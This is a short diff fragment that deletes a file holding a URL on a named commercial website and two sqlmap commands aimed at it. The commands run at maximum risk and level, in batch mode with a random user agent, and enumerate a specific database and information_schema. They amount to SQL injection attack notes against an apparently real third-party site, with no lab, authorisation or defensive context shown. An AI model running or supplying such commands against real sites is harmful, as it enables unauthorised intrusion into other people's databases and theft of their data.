@@ -1,3 +1,0 @@
-http://www.windowfrance.com/detail_collection.php?col_num=123
-python ../sqlmap/sqlmap.py -u http://www.windowfrance.com/detail_collection.php?col_num=123 --risk 3 --level 5 --batch --random-agent -D bddwmcom
-python ../sqlmap/sqlmap.py -u http://www.windowfrance.com/detail_collection.php?col_num=123 --risk 3 --level 5 --batch --random-agent -D information_schema
